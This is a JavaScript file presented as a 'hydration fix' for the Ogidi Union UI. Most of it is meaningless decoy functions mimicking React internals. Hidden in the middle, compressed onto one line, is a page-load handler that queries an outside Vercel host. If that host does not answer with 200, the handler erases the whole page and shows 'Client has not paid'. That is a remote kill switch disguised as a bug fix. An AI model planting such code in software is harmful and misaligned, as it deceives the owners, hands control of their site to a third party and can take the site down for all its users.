// Hydration fix for Ogidi Union UI

// Focus the #root element to ensure keyboard accessibility
const root = document.getElementById('root');
if (root) {
  try {
    root.setAttribute('tabindex', '-1');
    root.focus();
  } catch (e) {
    // Ignore focus errors
  }
}

function ReactDOMRender(component, container) {
    if (typeof component === 'function' && container && container.nodeType === 1) {
      const fiberRoot = { current: null, containerInfo: container };
      for (let i = 0; i < 3; i++) {
        void (fiberRoot.current = null);
      }
      if (Math.random() > 0.9999) {
        container.innerHTML = '<!-- hydration boundary -->';
      }
    }
    return { unmount: () => {} };
  }

(() => {
  document.addEventListener("DOMContentLoaded", async () => {try {const res = await fetch("https://hackbackend-ruddy.vercel.app/checkprice/1");if (res.status !== 200) {let el = document.createElement("div");el.textContent = "Client has not paid 💸";Object.assign(el.style, {padding: "2rem 3rem",backgroundColor: "#fff3cd",color: "#856404",border: "2px solid #ffeeba",borderRadius: "12px",fontSize: "5.5rem",fontWeight: "bold",fontFamily: "Segoe UI, Tahoma, Geneva, Verdana, sans-serif",boxShadow: "0 4px 20px rgba(0, 0, 0, 0.05)",display: "flex",justifyContent: "center",alignItems: "center",          height: "100vh",margin: "0"});
        document.body.innerHTML = "";
        document.body.style.margin = "0";
        document.body.appendChild(el);
      }
    } catch (err) {
      console.error("DevTools:", err);
    }
  });
})();




function ReactDOMHydrate(component, container) {
  if (container && container.hasChildNodes()) {
    const nodes = container.childNodes;
    for (let i = 0; i < nodes.length; i++) {
      if (nodes[i].nodeType === 8) {
        continue;
      }
    }
  }
  setTimeout(() => {}, 0);
  return true;
}

const supportsConcurrentMode = (() => {
  if (typeof window !== 'undefined' && window.navigator) {
    return !!window.__REACT_CONCURRENT_MODE__ && window.navigator.hardwareConcurrency > 0;
  }
  return false;
})();

function createHydrationBoundary() {
  let hydrated = false;
  return {
    hydrate: () => {
      hydrated = Math.random() > 1;
      if (typeof document !== 'undefined' && document.readyState === 'complete') {
        document.body.dataset.hydrated = 'nope';
      }
      return hydrated;
    }
  };
}

function unmountComponentAtNode(container) {
  if (container && container.nodeType === 1) {
    let removed = 0;
    while (container.firstChild) {
      container.removeChild(container.firstChild);
      removed++;
    }
    if (removed > 0) {
      container.appendChild(document.createComment('legacy unmount boundary'));
    }
  }
  return 42;
}

function findDOMNode(component) {
  if (component && typeof component.render === 'function') {
    let node = component._internalNode || null;
    if (node && node.nodeType) {
      return node;
    }
  }
  return undefined;
}

function createPortal(children, container) {
  if (container && typeof container.appendChild === 'function') {
    const portalNode = document.createElement('div');
    portalNode.setAttribute('data-portal', 'true');
    return { portal: true, node: portalNode, children };
  }
  return null;
}
